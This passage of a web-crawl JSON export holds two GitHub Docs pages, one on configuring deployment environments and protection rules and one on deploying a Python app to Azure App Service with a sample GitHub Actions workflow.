timer.\nSelect Wait timer.\nEnter the number of minutes to wait.\nClick Save protection rules.\nOptionally, disallow bypassing configured protection rules. For more information, see Allow administrators to bypass configured protection rules.\nDeselect Allow administrators to bypass configured protection rules.\nClick Save protection rules.\nOptionally, enable any custom deployment protection rules that have been created with GitHub Apps. For more information, see Custom deployment protection rules.\nSelect the custom protection rule you want to enable.\nClick Save protection rules.\nOptionally, specify what branches and tags can deploy to this environment. For more information, see Deployment branches and tags.\nSelect the desired option in the Deployment branches dropdown.\nIf you chose Selected branches and tags, to add a new rule, click Add deployment branch or tag rule\nIn the \"Ref type\" dropdown menu, depending on what rule you want to apply, click Branch or Tag.\nEnter the name pattern for the branch or tag that you want to allow.\nNote\nName patterns must be configured for branches or tags individually.\nClick Add rule.\nOptionally, add environment secrets. These secrets are only available to workflow jobs that use the environment. Additionally, workflow jobs that use this environment can only access these secrets after any configured rules (for example, required reviewers) pass. For more information, see Environment secrets.\nUnder Environment secrets, click Add Secret.\nEnter the secret name.\nEnter the secret value.\nClick Add secret.\nOptionally, add environment variables. These variables are only available to workflow jobs that use the environment, and are only accessible using the vars context. For more information, see Environment variables.\nUnder Environment variables, click Add Variable.\nEnter the variable name.\nEnter the variable value.\nClick Add variable.\nYou can also create and configure environments through the REST API. For more information, see REST API endpoints for deployment environments, REST API endpoints for GitHub Actions Secrets, REST API endpoints for GitHub Actions variables, and REST API endpoints for deployment branch policies.\nRunning a workflow that references an environment that does not exist will create an environment with the referenced name. If the environment is created from running implicit page builds (for example, from a branch or folder source), the source branch will be added as a protection rule to the environment. Otherwise, the newly created environment will not have any protection rules or secrets configured. Anyone that can edit workflows in the repository can create environments via a workflow file, but only repository admins can configure the environment.\nDeleting an environment\nTo configure an environment in a personal account repository, you must be the repository owner. To configure an environment in an organization repository, you must have admin access.\nDeleting an environment will delete all secrets and protection rules associated with the environment. Any jobs currently waiting because of protection rules from the deleted environment will automatically fail.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Environments.\nNext to the environment that you want to delete, click .\nClick I understand, delete this environment.\nYou can also delete environments through the REST API. For more information, see REST API endpoints for repositories.\nHow environments relate to deployments\nWhen a workflow job that references an environment runs, it creates a deployment object with the environment property set to the name of your environment. As the workflow progresses, it also creates deployment status objects with the environment property set to the name of your environment, the environment_url property set to the URL for environment (if specified in the workflow), and the state property set to the status of the job.\nYou can access these objects through the REST API or GraphQL API. You can also subscribe to these webhook events. For more information, see REST API endpoints for repositories, Objects (GraphQL API), or Webhook events and payloads.\nNext steps\nGitHub Actions provides several features for managing your deployments. For more information, see Deploying with GitHub Actions.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-managing-environments-for-deployment-663d1.html",
  "markdown": "# Managing environments for deployment - GitHub Docs\n\nYou can create environments and secure those environments with deployment protection rules. A job that references an environment must follow any protection rules for the environment before running or accessing the environment's secrets.\n\n## Who can use this feature?\n\nEnvironments, environment secrets, and deployment protection rules are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. For access to environments, environment secrets, and deployment branches in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, other deployment protection rules, such as a wait timer or required reviewers, are only available for public repositories.\n\n## [About environments](#about-environments)\n\nEnvironments are used to describe a general deployment target like `production`, `staging`, or `development`. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. For more information about viewing deployments to environments, see [Viewing deployment history](https://docs.github.com/en/actions/deployment/managing-your-deployments/viewing-deployment-history).\n\nYou can configure environments with protection rules and secrets. When a workflow job references an environment, the job won't start until all of the environment's protection rules pass. A job also cannot access secrets that are defined in an environment until all the deployment protection rules pass.\n\nOptionally, you can bypass an environment's protection rules and force all pending jobs referencing the environment to proceed. For more information, see [Reviewing deployments](https://docs.github.com/en/actions/managing-workflow-runs/reviewing-deployments#bypassing-environment-protection-rules).\n\nNote\n\nUsers with GitHub Free plans can only configure environments for public repositories. If you convert a repository from public to private, any configured protection rules or environment secrets will be ignored, and you will not be able to configure any environments. If you convert your repository back to public, you will have access to any previously configured protection rules and environment secrets.\n\nOrganizations with GitHub Team and users with GitHub Pro can configure environments for private repositories. For more information, see [GitHub’s plans](https://docs.github.com/en/get-started/learning-about-github/githubs-plans).\n\n## [Deployment protection rules](#deployment-protection-rules)\n\nDeployment protection rules require specific conditions to pass before a job referencing the environment can proceed. You can use deployment protection rules to require a manual approval, delay a job, or restrict the environment to certain branches. You can also create and implement custom protection rules powered by GitHub Apps to use third-party systems to control deployments referencing environments configured on GitHub.\n\nThird-party systems can be observability systems, change management systems, code quality systems, or other manual configurations that you use to assess readiness before deployments are safely rolled out to environments.\n\nNote\n\nAny number of GitHub Apps-based deployment protection rules can be installed on a repository. However, a maximum of 6 deployment protection rules can be enabled on any environment at the same time.\n\n### [Required reviewers](#required-reviewers)\n\nUse required reviewers to require a specific person or team to approve workflow jobs that reference the environment. You can list up to six users or teams as reviewers. The reviewers must have at least read access to the repository. Only one of the required reviewers needs to approve the job for it to proceed.\n\nYou also have the option to prevent self-reviews for deployments to protected environments. If you enable this setting, users who initiate a deployment cannot approve the deployment job, even if they are a required reviewer. This ensures that deployments to protected environments are always reviewed by more than one person.\n\nFor more information on reviewing jobs that reference an environment with required reviewers, see [Reviewing deployments](https://docs.github.com/en/actions/managing-workflow-runs/reviewing-deployments).\n\nNote\n\nIf you are on a GitHub Free, GitHub Pro, or GitHub Team plan, required reviewers are only available for public repositories.\n\n### [Wait timer](#wait-timer)\n\nUse a wait timer to delay a job for a specific amount of time after the job is initially triggered. The time (in minutes) must be an integer between 1 and 43,200 (30 days). Wait time will not count towards your billable time.\n\nNote\n\nIf you are on a GitHub Free, GitHub Pro, or GitHub Team plan, wait timers are only available for public repositories.\n\n### [Deployment branches and tags](#deployment-branches-and-tags)\n\nUse deployment branches and tags to restrict which branches and tags can deploy to the environment. Below are the options for deployment branches and tags for an environment:\n\n*   **No restriction:** No restriction on which branch or tag can deploy to the environment.\n    \n*   **Protected branches only:** Only branches with branch protection rules enabled can deploy to the environment. If no branch protection rules are defined for any branch in the repository, then all branches can deploy. For more information about branch protection rules, see [About protected branches](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches).\n    \n    Note\n    \n    Deployment workflow runs triggered by tags with the same name as a protected branch and forks with branches that match the protected branch name cannot deploy to the environment.\n    \n*   **Selected branches and tags:** Only branches and tags that match your specified name patterns can deploy to the environment.\n    \n    If you specify `releases/*` as a deployment branch or tag rule, only a branch or tag whose name begins with `releases/` can deploy to the environment. (Wildcard characters will not match `/`. To match branches or tags that begin with `release/` and contain an additional single slash, use `release/*/*`.) If you add `main` as a branch rule, a branch named `main` can also deploy to the environment. For more information about syntax options for deployment branches, see the [Ruby `File.fnmatch` documentation](https://ruby-doc.org/core-2.5.1/File.html#method-c-fnmatch).\n    \n    Note\n    \n    Name patterns must be configured for branches or tags individually.\n    \n\nNote\n\nDeployment branches and tags are available for all public repositories. For users on GitHub Pro or GitHub Team plans, deployment branches and tags are also available for private repositories.\n\n### [Allow administrators to bypass configured protection rules](#allow-administrators-to-bypass-configured-protection-rules)\n\nBy default, administrators can bypass the protection rules and force deployments to specific environments. For more information, see [Reviewing deployments](https://docs.github.com/en/actions/managing-workflow-runs/reviewing-deployments#bypassing-environment-protection-rules).\n\nAlternatively, you can configure environments to disallow bypassing the protection rules for all deployments to the environment.\n\nNote\n\nAllowing administrators to bypass protection rules is only available for public repositories for users on GitHub Free, GitHub Pro, and GitHub Team plans.\n\n### [Custom deployment protection rules](#custom-deployment-protection-rules)\n\nNote\n\nCustom deployment protection rules are currently in public preview and subject to change.\n\nYou can enable your own custom protection rules to gate deployments with third-party services. For example, you can use services such as Datadog, Honeycomb, and ServiceNow to provide automated approvals for deployments to GitHub. For more information, see [Creating custom deployment protection rules](https://docs.github.com/en/actions/deployment/protecting-deployments/creating-custom-deployment-protection-rules).\n\nOnce custom deployment protection rules have been created and installed on a repository, you can enable the custom deployment protection rule for any environment in the repository. For more information about configuring and enabling custom deployment protection rules, see [Configuring custom deployment protection rules](https://docs.github.com/en/actions/deployment/protecting-deployments/configuring-custom-deployment-protection-rules).\n\nNote\n\nCustom deployment protection rules are only available for public repositories for users on GitHub Free, GitHub Pro, and GitHub Team plans.\n\n## [Environment secrets](#environment-secrets)\n\nSecrets stored in an environment are only available to workflow jobs that reference the environment. If the environment requires approval, a job cannot access environment secrets until one of the required reviewers approves it. For more information about secrets, see [About secrets](https://docs.github.com/en/actions/security-for-github-actions/security-guides/about-secrets).\n\nNote\n\n*   Workflows that run on self-hosted runners are not run in an isolated container, even if they use environments. Environment secrets should be treated with the same level of security as repository and organization secrets. For more information, see [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners).\n*   If you are using GitHub Free, environment secrets are only available in public repositories. For access to environment secrets in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. For more information on switching your plan, see [Upgrading your account's plan](https://docs.github.com/en/billing/managing-the-plan-for-your-github-account/upgrading-your-accounts-plan).\n\n## [Environment variables](#environment-variables)\n\nVariables stored in an environment are only available to workflow jobs that reference the environment. These variables are only accessible using the [`vars`](https://docs.github.com/en/actions/learn-github-actions/contexts#vars-context) context. For more information, see [Store information in variables](https://docs.github.com/en/actions/learn-github-actions/variables).\n\nNote\n\nEnvironment variables are available for all public repositories. For users on GitHub Pro or GitHub Team plans, environment variables are also available for private repositories.\n\n## [Creating an environment](#creating-an-environment)\n\nTo configure an environment in a personal account repository, you must be the repository owner. To configure an environment in an organization repository, you must have `admin` access.\n\nNote\n\n*   Creation of an environment in a private repository is available to organizations with GitHub Team and users with GitHub Pro.\n*   Some features for environments have no or limited availability for private repositories. If you are unable to access a feature described in the instructions below, please see the documentation linked in the related step for availability information.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of a repository header showing the tabs. The \"Settings\" tab is highlighted by a dark orange outline.](https://docs.github.com/assets/cb-28260/images/help/repository/repo-actions-settings.png)\n    \n3.  In the left sidebar, click **Environments**.\n    \n4.  Click **New environment**.\n    \n5.  Enter a name for the environment, then click **Configure environment**. Environment names are not case sensitive. An environment name may not exceed 255 characters and must be unique within the repository.\n    \n6.  Optionally, specify people or teams that must approve workflow jobs that use this environment. For more information, see [Required reviewers](#required-reviewers).\n    \n    1.  Select **Required reviewers**.\n    2.  Enter up to 6 people or teams. Only one of the required reviewers needs to approve the job for it to proceed.\n    3.  Optionally, to prevent users from approving workflows runs that they triggered, select **Prevent self-review**.\n    4.  Click **Save protection rules**.\n7.  Optionally, specify the amount of time to wait before allowing workflow jobs that use this environment to proceed. For more information, see [Wait timer](#wait-timer).\n    \n    1.  Select **Wait timer**.\n    2.  Enter the number of minutes to wait.\n    3.  Click **Save protection rules**.\n8.  Optionally, disallow bypassing configured protection rules. For more information, see [Allow administrators to bypass configured protection rules](#allow-administrators-to-bypass-configured-protection-rules).\n    \n    1.  Deselect **Allow administrators to bypass configured protection rules**.\n    2.  Click **Save protection rules**.\n9.  Optionally, enable any custom deployment protection rules that have been created with GitHub Apps. For more information, see [Custom deployment protection rules](#custom-deployment-protection-rules).\n    \n    1.  Select the custom protection rule you want to enable.\n    2.  Click **Save protection rules**.\n10.  Optionally, specify what branches and tags can deploy to this environment. For more information, see [Deployment branches and tags](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-branches-and-tags).\n    \n    1.  Select the desired option in the **Deployment branches** dropdown.\n        \n    2.  If you chose **Selected branches and tags**, to add a new rule, click **Add deployment branch or tag rule**\n        \n    3.  In the \"Ref type\" dropdown menu, depending on what rule you want to apply, click **Branch** or **Tag**.\n        \n    4.  Enter the name pattern for the branch or tag that you want to allow.\n        \n        Note\n        \n        Name patterns must be configured for branches or tags individually.\n        \n    5.  Click **Add rule**.\n        \n11.  Optionally, add environment secrets. These secrets are only available to workflow jobs that use the environment. Additionally, workflow jobs that use this environment can only access these secrets after any configured rules (for example, required reviewers) pass. For more information, see [Environment secrets](#environment-secrets).\n    \n    1.  Under **Environment secrets**, click **Add Secret**.\n    2.  Enter the secret name.\n    3.  Enter the secret value.\n    4.  Click **Add secret**.\n12.  Optionally, add environment variables. These variables are only available to workflow jobs that use the environment, and are only accessible using the [`vars`](https://docs.github.com/en/actions/learn-github-actions/contexts#vars-context) context. For more information, see [Environment variables](#environment-variables).\n    \n    1.  Under **Environment variables**, click **Add Variable**.\n    2.  Enter the variable name.\n    3.  Enter the variable value.\n    4.  Click **Add variable**.\n\nYou can also create and configure environments through the REST API. For more information, see [REST API endpoints for deployment environments](https://docs.github.com/en/rest/deployments/environments), [REST API endpoints for GitHub Actions Secrets](https://docs.github.com/en/rest/actions/secrets), [REST API endpoints for GitHub Actions variables](https://docs.github.com/en/rest/actions/variables), and [REST API endpoints for deployment branch policies](https://docs.github.com/en/rest/deployments/branch-policies).\n\nRunning a workflow that references an environment that does not exist will create an environment with the referenced name. If the environment is created from running implicit page builds (for example, from a branch or folder source), the source branch will be added as a protection rule to the environment. Otherwise, the newly created environment will not have any protection rules or secrets configured. Anyone that can edit workflows in the repository can create environments via a workflow file, but only repository admins can configure the environment.\n\n## [Deleting an environment](#deleting-an-environment)\n\nTo configure an environment in a personal account repository, you must be the repository owner. To configure an environment in an organization repository, you must have `admin` access.\n\nDeleting an environment will delete all secrets and protection rules associated with the environment. Any jobs currently waiting because of protection rules from the deleted environment will automatically fail.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of a repository header showing the tabs. The \"Settings\" tab is highlighted by a dark orange outline.](https://docs.github.com/assets/cb-28260/images/help/repository/repo-actions-settings.png)\n    \n3.  In the left sidebar, click **Environments**.\n    \n4.  Next to the environment that you want to delete, click .\n    \n5.  Click **I understand, delete this environment**.\n    \n\nYou can also delete environments through the REST API. For more information, see [REST API endpoints for repositories](https://docs.github.com/en/rest/repos#environments).\n\n## [How environments relate to deployments](#how-environments-relate-to-deployments)\n\nWhen a workflow job that references an environment runs, it creates a deployment object with the `environment` property set to the name of your environment. As the workflow progresses, it also creates deployment status objects with the `environment` property set to the name of your environment, the `environment_url` property set to the URL for environment (if specified in the workflow), and the `state` property set to the status of the job.\n\nYou can access these objects through the REST API or GraphQL API. You can also subscribe to these webhook events. For more information, see [REST API endpoints for repositories](https://docs.github.com/en/rest/repos#deployments), [Objects](https://docs.github.com/en/graphql/reference/objects#deployment) (GraphQL API), or [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#deployment).\n\n## [Next steps](#next-steps)\n\nGitHub Actions provides several features for managing your deployments. For more information, see [Deploying with GitHub Actions](https://docs.github.com/en/actions/deployment/about-deployments/deploying-with-github-actions).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 279,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-managing-environments-for-deployment-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-managing-environments-for-deployment-removedElementsHtm",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-managing-environments-for-deployment-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-managing-environments-for-deployment-readableTextHtmlUr",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-managing-environments-for-deployment-readableTextIfPoss"
    },
    "lengths": {
      "extractus": 24877,
      "readableText": 22160,
      "none": 43915,
      "readableTextIfPossible": 22160,
      "result": 22160,
      "markdown": 18893
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service",
    "loadedTime": "2025-05-08T06:42:30.725Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service",
    "title": "Deploying Python to Azure App Service - GitHub Docs",
    "description": "You can deploy your Python project to Azure App Service as part of your continuous deployment (CD) workflows.",
    "author": null,
    "keywords": "CD,Python,Azure App Service",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Deploying Python to Azure App Service - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "734A:19A59E:43B574:55D473:681C524E",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:23 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686543.830707, VS0, VE320",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29451",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Deploying Python to Azure App Service\nYou can deploy your Python project to Azure App Service as part of your continuous deployment (CD) workflows.\nIntroduction\nThis guide explains how to use GitHub Actions to build and deploy a Python project to Azure App Service.\nNote\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see About security hardening with OpenID Connect. and Configuring OpenID Connect in Azure.\nPrerequisites\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\nCreate an Azure App Service plan.\nFor example, you can use the Azure CLI to create a new App Service plan:\nBash\naz appservice plan create \\ --resource-group MY_RESOURCE_GROUP \\ --name MY_APP_SERVICE_PLAN \\ --is-linux \nIn the command above, replace MY_RESOURCE_GROUP with your pre-existing Azure Resource Group, and MY_APP_SERVICE_PLAN with a new name for the App Service plan.\nSee the Azure documentation for more information on using the Azure CLI:\nFor authentication, see Sign in with Azure CLI.\nIf you need to create a new resource group, see az group.\nCreate a web app.\nFor example, you can use the Azure CLI to create an Azure App Service web app with a Python runtime:\nBash\naz webapp create \\ --name MY_WEBAPP_NAME \\ --plan MY_APP_SERVICE_PLAN \\ --resource-group MY_RESOURCE_GROUP \\ --runtime \"python|3.8\" \nIn the command above, replace the parameters with your own values, where MY_WEBAPP_NAME is a new name for the web app.\nConfigure an Azure publish profile and create an AZURE_WEBAPP_PUBLISH_PROFILE secret.\nGenerate your Azure deployment credentials using a publish profile. For more information, see Generate deployment credentials in the Azure documentation.\nIn your GitHub repository, create a secret named AZURE_WEBAPP_PUBLISH_PROFILE that contains the contents of the publish profile. For more information on creating secrets, see Using secrets in GitHub Actions.\nAdd an app setting called SCM_DO_BUILD_DURING_DEPLOYMENT and set the value to 1.\nOptionally, configure a deployment environment. Environments are used to describe a general deployment target like production, staging, or development. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, see Managing environments for deployment.\nCreating the workflow\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\nThe following example workflow demonstrates how to build and deploy a Python project to Azure App Service when there is a push to the main branch.\nEnsure that you set AZURE_WEBAPP_NAME in the workflow env key to the name of the web app you created. If you use a version of Python other than 3.8, change PYTHON_VERSION to the version that you use.\nIf you configured a deployment environment, change the value of environment to be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete the environment key.\nYAML\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Build and deploy Python app to Azure Web App env: AZURE_WEBAPP_NAME: MY_WEBAPP_NAME # set this to your application's name PYTHON_VERSION: '3.8' # set this to the Python version to use on: push: branches: - main jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Set up Python version uses: actions/setup-python@v5 with: python-version: ${{ env.PYTHON_VERSION }} - name: Create and start virtual environment run: | python -m venv venv source venv/bin/activate - name: Set up dependency caching for faster installs uses: actions/cache@v4 with: path: ~/.cache/pip key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }} restore-keys: | ${{ runner.os }}-pip- - name: Install dependencies run: pip install -r requirements.txt # Optional: Add a step to run tests here (PyTest, Django test suites, etc.) - name: Upload artifact for deployment jobs uses: actions/upload-artifact@v4 with: name: python-app path: | . !venv/ deploy: runs-on: ubuntu-latest needs: build environment: name: 'production' url: ${{ steps.deploy-to-webapp.outputs.webapp-url }} steps: - name: Download artifact from build job uses: actions/download-artifact@v4 with: name: python-app path: . - name: 'Deploy to Azure Web App' id: deploy-to-webapp uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c with: app-name: ${{ env.AZURE_WEBAPP_NAME }} publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }} \nAdditional resources\nThe following resources may also be useful:\nFor the original workflow template, see azure-webapps-python.yml in the GitHub Actions starter-workflows repository.\nThe action used to deploy the web app is the official Azure Azure/webapps-deploy action.\nFor more examples of GitHub Action workflows that deploy to Azure, see the actions-workflow-samples repository.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-python-to-azure-app-service-ef2fj.html",
  "markdown": "# Deploying Python to Azure App Service\n\nYou can deploy your Python project to Azure App Service as part of your continuous deployment (CD) workflows.\n\n## [Introduction](#introduction)\n\nThis guide explains how to use GitHub Actions to build and deploy a Python project to [Azure App Service](https://azure.microsoft.com/services/app-service/).\n\nNote\n\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect). and [Configuring OpenID Connect in Azure](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure).\n\n## [Prerequisites](#prerequisites)\n\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\n\n1.  Create an Azure App Service plan.\n    \n    For example, you can use the Azure CLI to create a new App Service plan:\n    \n    Bash\n    \n    ```\n    az appservice plan create \\\n       --resource-group MY_RESOURCE_GROUP \\\n       --name MY_APP_SERVICE_PLAN \\\n       --is-linux\n    ```\n    \n    In the command above, replace `MY_RESOURCE_GROUP` with your pre-existing Azure Resource Group, and `MY_APP_SERVICE_PLAN` with a new name for the App Service plan.\n    \n    See the Azure documentation for more information on using the [Azure CLI](https://docs.microsoft.com/cli/azure/):\n    \n    *   For authentication, see [Sign in with Azure CLI](https://docs.microsoft.com/cli/azure/authenticate-azure-cli).\n    *   If you need to create a new resource group, see [az group](https://docs.microsoft.com/cli/azure/group?view=azure-cli-latest#az_group_create).\n2.  Create a web app.\n    \n    For example, you can use the Azure CLI to create an Azure App Service web app with a Python runtime:\n    \n    Bash\n    \n    ```\n    az webapp create \\\n        --name MY_WEBAPP_NAME \\\n        --plan MY_APP_SERVICE_PLAN \\\n        --resource-group MY_RESOURCE_GROUP \\\n        --runtime \"python|3.8\"\n    ```\n    \n    In the command above, replace the parameters with your own values, where `MY_WEBAPP_NAME` is a new name for the web app.\n    \n3.  Configure an Azure publish profile and create an `AZURE_WEBAPP_PUBLISH_PROFILE` secret.\n    \n    Generate your Azure deployment credentials using a publish profile. For more information, see [Generate deployment credentials](https://docs.microsoft.com/azure/app-service/deploy-github-actions?tabs=applevel#generate-deployment-credentials) in the Azure documentation.\n    \n    In your GitHub repository, create a secret named `AZURE_WEBAPP_PUBLISH_PROFILE` that contains the contents of the publish profile. For more information on creating secrets, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions#creating-secrets-for-a-repository).\n    \n4.  Add an app setting called `SCM_DO_BUILD_DURING_DEPLOYMENT` and set the value to `1`.\n    \n5.  Optionally, configure a deployment environment. Environments are used to describe a general deployment target like `production`, `staging`, or `development`. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment).\n    \n\n## [Creating the workflow](#creating-the-workflow)\n\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\n\nThe following example workflow demonstrates how to build and deploy a Python project to Azure App Service when there is a push to the `main` branch.\n\nEnsure that you set `AZURE_WEBAPP_NAME` in the workflow `env` key to the name of the web app you created. If you use a version of Python other than `3.8`, change `PYTHON_VERSION` to the version that you use.\n\nIf you configured a deployment environment, change the value of `environment` to be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete the `environment` key.\n\nYAML\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy Python app to Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  PYTHON_VERSION: '3.8'               # set this to the Python version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python version\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ env.PYTHON_VERSION }}\n\n      - name: Create and start virtual environment\n        run: |\n          python -m venv venv\n          source venv/bin/activate\n\n      - name: Set up dependency caching for faster installs\n        uses: actions/cache@v4\n        with:\n          path: ~/.cache/pip\n          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}\n          restore-keys: |\n            ${{ runner.os }}-pip-\n\n      - name: Install dependencies\n        run: pip install -r requirements.txt\n\n      # Optional: Add a step to run tests here (PyTest, Django test suites, etc.)\n\n      - name: Upload artifact for deployment jobs\n        uses: actions/upload-artifact@v4\n        with:\n          name: python-app\n          path: |\n            .\n            !venv/\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n      - name: Download artifact from build job\n        uses: actions/download-artifact@v4\n        with:\n          name: python-app\n          path: .\n\n      - name: 'Deploy to Azure Web App'\n        id: deploy-to-webapp\n        